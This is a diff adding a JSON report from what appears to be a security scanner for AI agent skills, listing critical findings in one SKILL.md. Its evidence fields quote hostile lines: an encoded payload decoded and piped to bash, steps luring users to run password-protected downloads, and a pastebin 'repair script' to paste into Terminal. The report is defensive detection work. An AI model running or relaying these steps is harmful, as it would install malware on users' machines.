@@ -1,0 +1,255 @@
+{
+  "as_of": "2026-11-17",
+  "errors": [],
+  "exit_code": 1,
+  "fail_on": "high",
+  "findings": [
+    {
+      "baseline": null,
+      "evidence": "echo 'Y3Vy***' | base64 -d | bash",
+      "fingerprint": "cbae8650ed58ef5188bf9fb084b0b739e5adaa433dac077ea28e8d7e9b8e9345",
+      "fix": "Write the command out in plain text where a reviewer can read it, and remove the step that decodes and runs it.",
+      "item": ".",
+      "location": {
+        "line": 26,
+        "path": "SKILL.md"
+      },
+      "malicious_indicator": true,
+      "rule_id": "SW-SKL-004",
+      "rule_url": "https://spellwarden.ai/docs/rules/sw-skl-004?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+      "severity": "critical",
+      "suppressed": false,
+      "tags": {
+        "atlas": [
+          "AML.T0011.002"
+        ],
+        "nist": [
+          "SR-3"
+        ],
+        "owasp_agentic": [
+          "ASI04"
+        ],
+        "owasp_ast": [
+          "AST01"
+        ],
+        "owasp_mcp": []
+      },
+      "title": "Encoded payload decoded and executed"
+    },
+    {
+      "baseline": null,
+      "evidence": "- **Windows:** download [toolkit.zip](https://files.example.com/dl/toolkit.zip) (pass: *** and run the installer inside.",
+      "fingerprint": "34b8efe4680939925ea7229262b7bb45f268c4717f1db7462552d9a0a9b0a4af",
+      "fix": "Remove the download and the pasted script, and name the tool by its package so the user installs it from a package manager or the vendor's site.",
+      "item": ".",
+      "location": {
+        "line": 16,
+        "path": "SKILL.md"
+      },
+      "malicious_indicator": true,
+      "rule_id": "SW-SKL-032",
+      "rule_url": "https://spellwarden.ai/docs/rules/sw-skl-032?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+      "severity": "critical",
+      "suppressed": false,
+      "tags": {
+        "atlas": [
+          "AML.T0011"
+        ],
+        "nist": [
+          "SR-3",
+          "SI-3"
+        ],
+        "owasp_agentic": [
+          "ASI04",
+          "ASI09"
+        ],
+        "owasp_ast": [
+          "AST01"
+        ],
+        "owasp_mcp": []
+      },
+      "title": "Instructions lure the user into running a password-protected download or a pasted script"
+    },
+    {
+      "baseline": null,
+      "evidence": "- **macOS:** download https://files.example.com/dl/toolkit.dmg, then open it and launch the app (pass: ***",
+      "fingerprint": "4b0b2cbfcdd3e16f2640d95f5a215c4fdca2968421b932e3e090f240846d2f8e",
+      "fix": "Remove the download and the pasted script, and name the tool by its package so the user installs it from a package manager or the vendor's site.",
+      "item": ".",
+      "location": {
+        "line": 17,
+        "path": "SKILL.md"
+      },
+      "malicious_indicator": true,
+      "rule_id": "SW-SKL-032",
+      "rule_url": "https://spellwarden.ai/docs/rules/sw-skl-032?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+      "severity": "critical",
+      "suppressed": false,
+      "tags": {
+        "atlas": [
+          "AML.T0011"
+        ],
+        "nist": [
+          "SR-3",
+          "SI-3"
+        ],
+        "owasp_agentic": [
+          "ASI04",
+          "ASI09"
+        ],
+        "owasp_ast": [
+          "AST01"
+        ],
+        "owasp_mcp": []
+      },
+      "title": "Instructions lure the user into running a password-protected download or a pasted script"
+    },
+    {
+      "baseline": null,
+      "evidence": "Copy the repair script from https://pastebin.com/raw/Zq81ExAmPle and paste it into Terminal.",
+      "fingerprint": "3fb61429f53db59914871cfde40389894766ea707ca3dfc910e0c1eea5b3a0e3",
+      "fix": "Remove the download and the pasted script, and name the tool by its package so the user installs it from a package manager or the vendor's site.",
+      "item": ".",
+      "location": {
+        "line": 21,
+        "path": "SKILL.md"
+      },
+      "malicious_indicator": true,
+      "rule_id": "SW-SKL-032",
+      "rule_url": "https://spellwarden.ai/docs/rules/sw-skl-032?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+      "severity": "critical",
+      "suppressed": false,
+      "tags": {
+        "atlas": [
+          "AML.T0011"
+        ],
+        "nist": [
+          "SR-3",
+          "SI-3"
+        ],
+        "owasp_agentic": [
+          "ASI04",
+          "ASI09"
+        ],
+        "owasp_ast": [
+          "AST01"
+        ],
+        "owasp_mcp": []
+      },
+      "title": "Instructions lure the user into running a password-protected download or a pasted script"
+    },
+    {
+      "baseline": null,
+      "evidence": "echo 'Y3Vy***' | base64 -d | bash",
+      "fingerprint": "2b890c7b2e9307b8d10991e9ee3ab0e4217fcde9465610e83cdcdf311e22f125",
+      "fix": "Remove the download and the pasted script, and name the tool by its package so the user installs it from a package manager or the vendor's site.",
+      "item": ".",
+      "location": {
+        "line": 26,
+        "path": "SKILL.md"
+      },
+      "malicious_indicator": true,
+      "rule_id": "SW-SKL-032",
+      "rule_url": "https://spellwarden.ai/docs/rules/sw-skl-032?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+      "severity": "critical",
+      "suppressed": false,
+      "tags": {
+        "atlas": [
+          "AML.T0011"
+        ],
+        "nist": [
+          "SR-3",
+          "SI-3"
+        ],
+        "owasp_agentic": [
+          "ASI04",
+          "ASI09"
+        ],
+        "owasp_ast": [
+          "AST01"
+        ],
+        "owasp_mcp": []
+      },
+      "title": "Instructions lure the user into running a password-protected download or a pasted script"
+    },
+    {
+      "baseline": null,
+      "evidence": "Matched after normalising: echo 'Y3Vy***' | base64 -d | bash",
+      "fingerprint": "2226c4f0daae8bea09f5e36e70c45dc19ddeb1a240b75a73cb39aa2029fb238e",
+      "fix": "Download the script to a file and check it against a published checksum before you run it, or install the tool from a package manager at a pinned version.",
+      "item": ".",
+      "location": {
+        "line": 26,
+        "path": "SKILL.md"
+      },
+      "malicious_indicator": false,
+      "rule_id": "SW-SKL-007",
+      "rule_url": "https://spellwarden.ai/docs/rules/sw-skl-007?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+      "severity": "high",
+      "suppressed": false,
+      "tags": {
+        "atlas": [
+          "AML.T0010.005"
+        ],
+        "nist": [
+          "SR-3"
+        ],
+        "owasp_agentic": [
+          "ASI04"
+        ],
+        "owasp_ast": [
+          "AST02"
+        ],
+        "owasp_mcp": [
+          "MCP04"
+        ]
+      },
+      "title": "Remote script piped to a shell"
+    }
+  ],
+  "items": [
+    {
+      "kind": "skill",
+      "name": ".",
+      "path": ".",
+      "plugin": null
+    }
+  ],
+  "lint": [
+    {
+      "left_out": 0,
+      "notes": [
+        {
+          "id": "SW-LINT-002",
+          "message": "The description has no use-when clause (\"use when\", \"use this when\", \"when the user\" or \"triggers on\"), so an agent has to guess when the skill applies.",
+          "other_path": null,
+          "severity": "info"
+        },
+        {
+          "id": "SW-LINT-003",
+          "message": "The description names no trigger phrase: no quoted phrase and no list of requests, so an agent has few words to match a request against.",
+          "other_path": null,
+          "severity": "info"
+        }
+      ],
+      "skill": "."
+    }
+  ],
+  "lock": {
+    "added": [],
+    "changed": [],
+    "removed": [],
+    "status": "not_checked"
+  },
+  "notices": [
+    {
+      "code": "description_lint",
+      "message": "Description lint: 2 notes on 1 of 1 skill, informational, never changing the exit code. What each check means: https://spellwarden.ai/docs/activation-checks?utm_source=scanner&utm_medium=cli&utm_campaign=description-lint",
+      "path": ""
+    }
+  ],
+  "probes": [],
+  "rules_version": "2026.11.9",
+  "scanner_version": "1.22.0",
+  "schema": 1
+}
